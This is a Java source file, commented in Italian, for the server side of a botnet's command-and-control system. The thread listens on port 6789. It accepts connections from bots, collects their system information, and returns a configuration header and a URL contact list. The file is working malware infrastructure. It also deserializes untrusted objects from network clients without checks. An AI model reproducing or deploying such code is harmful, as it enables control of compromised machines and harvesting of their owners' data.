package control.server;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import application.Main;
import control.ConfigHeader;
import model.SystemInfoEntry;
import model.URLEntry;

/**
 * Thread presente sul server C&C che resta in ascolto in attesa di richieste
 * da parte dei bot.
 */
public class SocketBotServerThread extends Thread{

	ProgramLog programLog;
	ServerSocket serverSocket;
	Socket connectionSocket;
	ObjectOutputStream outToClient;
    ObjectInputStream inFromClient;				

	ConfigHeader outConfigHeader;
	ArrayList<URLEntry> outContactList;
	ArrayList<SystemInfoEntry> inSystemInfo;
	
	/**
	 * Il metodo run() contiene un ciclo senza fine nel quale
	 * per ogni richiesta di connessione da parte di un bot riceve
	 * da quest'ultimo le informazioni di sistema e a sua volta invia
	 * il file di configurazione
	 */
	@SuppressWarnings("unchecked")
	@Override
	public void run() {
		programLog = ProgramLog.getProgramLog();
		
		
		try {
			serverSocket = new ServerSocket(6789);
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		while (true) {
			try {

				programLog.addInfo("Waiting for request");
				
				connectionSocket = serverSocket.accept();
				programLog.addInfo("Accepted request");
				outToClient = new ObjectOutputStream(connectionSocket.getOutputStream());
	            inFromClient = new ObjectInputStream(connectionSocket.getInputStream());				

	            inSystemInfo = (ArrayList<SystemInfoEntry>) inFromClient.readObject();		  
	            
	            Main.botServer.addSystemInfo(inSystemInfo);
	            outConfigHeader = Main.botServer.getConfig().getConfigHeader();
	            outToClient.writeObject(outConfigHeader);

	            outContactList = Main.botServer.getContactList();
	            outToClient.writeObject(outContactList);
				
			} catch (SocketException e) {
				programLog.addWarning(e.getMessage());
				break;
			} catch (IOException | ClassNotFoundException e) {
				e.printStackTrace();
			} 
		}
	}
	
	/**
	 * Chiusura della connessione nel momento in cui il thread viene interrotto
	 */
	@Override
	public void interrupt() {
		  try {
			    if(outToClient!=null)
			    	outToClient.close();
			    if(inFromClient!=null)
			    	inFromClient.close();
			  } catch (IOException e1) {
			    e1.printStackTrace();
			  }
			  if(!serverSocket.isClosed()){
				  try {
					serverSocket.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			  }
		super.interrupt();
	}
}
